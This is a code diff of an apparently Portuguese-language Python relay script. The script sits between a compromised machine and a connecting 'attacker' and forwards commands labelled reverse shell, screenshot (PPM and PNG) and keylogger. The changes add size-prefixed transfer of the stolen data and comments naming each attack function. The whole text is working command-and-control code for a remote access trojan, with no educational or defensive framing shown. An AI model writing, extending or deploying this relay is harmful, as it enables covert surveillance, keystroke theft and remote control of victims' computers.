@@ -30,12 +30,10 @@ print(">>> Aguardando conexão do atacante... <<<")
 conn2, addr2 = sock2.accept()
 print(">>> Conexão estabelecida com atacante:", addr2, "<<<")
 
-msg = "".encode('utf-8')
-
 # Main loop for sending and receiving messages
 while True:
     data2 = conn2.recv(1024)
-    if data2.decode('utf-8').rstrip('\n\x00') == "1":
+    if data2.decode('utf-8').rstrip('\n\x00') == "1":   # Reverse shell
         conn1.sendall(data2)
         while True:
             data2 = conn2.recv(1024)
@@ -43,42 +41,67 @@ while True:
                 conn1.sendall(data2)
                 break
             conn1.sendall(data2)
-            msg = "".encode('utf-8')
-            while True:
+
+            fileSize = 0
+            count = 0
+            data1 = conn1.recv(1024)    # File size
+            try:
+                fileSize = int(data1.decode('utf-8').rstrip('\x00'))
+            except:
+                pass
+            conn2.sendall(data1)
+            while (count < fileSize):
                 data1 = conn1.recv(1024)
-                if data1.decode('utf-8') == "END\n\x00":
-                    # Message ending
-                    msg += data1
-                    conn2.sendall(msg)
-                    break
-                elif data1.decode('utf-8').endswith("\x00END\n\x00"):
-                    # Message ending
-                    msg += data1
-                    conn2.sendall(msg)
-                    break
-                msg += data1
+                count += len(data1)
+                # Redirects the received message
+                conn2.sendall(data1)
         continue
-    elif data2.decode('utf-8').rstrip('\n\x00') == "3":
+    elif data2.decode('utf-8').rstrip('\n\x00') == "2": # Screenshot PPM
+        conn1.sendall(data2)
+        while True:
+            fileSize = 0
+            count = 0
+            data1 = conn1.recv(1024)    # File size
+            try:
+                fileSize = int(data1.decode('utf-8').rstrip('\x00'))
+            except:
+                pass
+            conn2.sendall(data1)
+            while (count < fileSize):
+                data1 = conn1.recv(1024)
+                count += len(data1)
+                # Redirects the received message
+                conn2.sendall(data1)
+            break
+        continue
+    elif data2.decode('utf-8').rstrip('\n\x00') == "3": # Screenshot PNG
         conn1.sendall(data2)
         data2 = conn2.recv(1024)
         conn1.sendall(data2)
-    elif data2.decode('utf-8').rstrip('\n\x00') == "4":
+        while True:
+            fileSize = 0
+            count = 0
+            data1 = conn1.recv(1024)    # File size
+            try:
+                fileSize = int(data1.decode('utf-8').rstrip('\x00'))
+            except:
+                pass
+            conn2.sendall(data1)
+            while (count < fileSize):
+                data1 = conn1.recv(1024)
+                count += len(data1)
+                # Redirects the received message
+                conn2.sendall(data1)
+            break
+        continue
+    elif data2.decode('utf-8').rstrip('\n\x00') == "4": # Keylogger
         conn1.sendall(data2)
         data1 = conn1.recv(1024)
         conn2.sendall(data1)
         continue
-    else:
+    else:   # Connection
         conn1.sendall(data2)
         break
-    while True:
-        data1 = conn1.recv(1024)
-        if data1.decode('utf-8') == "END\n\x00":
-            # Message ending
-            msg = data1
-            conn2.sendall(msg)
-            break
-        msg = data1
-        conn2.sendall(msg)
 
 sleep(1)
 
